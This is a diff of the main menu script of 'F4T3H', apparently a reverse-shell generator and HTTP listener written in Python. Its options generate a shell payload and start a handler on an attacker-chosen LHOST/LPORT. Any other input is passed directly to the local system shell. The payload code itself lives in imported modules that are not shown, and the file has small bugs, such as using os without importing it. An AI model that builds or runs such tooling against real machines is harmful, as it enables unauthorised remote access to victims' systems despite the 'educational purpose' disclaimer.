@@ -1,71 +1,56 @@
 
+# By: Hossam Hamdy (0xGhazy)
+# Python 3.8.4 used
+# use it for educational purpose only, Don't be evil ;)
 
-import sys
 from os import system
 from termcolor import colored
-from cores.HTTPHandler import HTTPHandler
-from cores.help_manager import help_man, banner
-from cores.Functions import check_host, check_port, generate_shell
+from Configurations import *
+from HTTPHandler import HTTPHandlerFunc
+from helper import help_handeler, banner, main_options
+from Functions import*
 
 
+if __name__ == '__main__':
 
-# Normal terminal
-TOOL_TERMINAL = colored("F4T3H> ", "green")
-
-
-
-
-
-
-
-
-def check_py_version():
-    py_version = sys.version_info[0]
-    if py_version != 3:
-        print(colored("[-] Python 3.x is required.", "red"))
-        print(colored("[-] Run it with python3", "red"))
-        exit()
-    else:
-        system("clear")
-
-
-def main():
-    system("clear")
-    check_py_version()
+    checking_requirements()
     banner()
+    main_options()
     
     while True:
+        CWD = colored(os.getcwd(), "red")
         try:
-            command = input(TOOL_TERMINAL)
-            if int(command) < 0 or int(command) > 4:
+            command = input(f"F4T3H({CWD})> ")
+            if int(command) < 0 or int(command) > 3:
                 print(colored("~_~", "red"))
         except ValueError:
+            # to skip error msg.
             pass
-
         if command == "":
             print(colored("~_~", "red"))
-            
-                
+
         elif command == "new" or command == "1":
             generate_shell()
 
-        elif command == "ls-conn" or command == "2":
-            pass
+        elif command == "start" or command == "2":
+            print_attacker_address()
+            lhost = input(colored("LHOST> ", "blue"))
+            lport = int(input(colored("LPORT> ", "blue")))
+            HTTPHandlerFunc(check_host(lhost), check_port(lport))
 
-        elif command == "listening" or command == "3":
-            rhost = input(colored("RHOST> ", "blue"))
-            rport = int(input(colored("RPORT> ", "blue")))
-            HTTPHandler(check_host(rhost), check_port(rport))
-
-        elif command == "help" or command == "4":
-            help_man()
+        elif command == "help" or command == "3":
+            help_handeler()
 
         elif command == "exit" or command == "0":
             exit(0)
+
+        elif "cd" in command:
+            _, directory = command.split(" ")
+            CWD = os.chdir(directory)
 
         else:
             system(command)
 
 
-if __name__ == '__main__':
-    main()
+# TODO: Supporting multi clients.
+# TODO: Supporting metasploit modules.
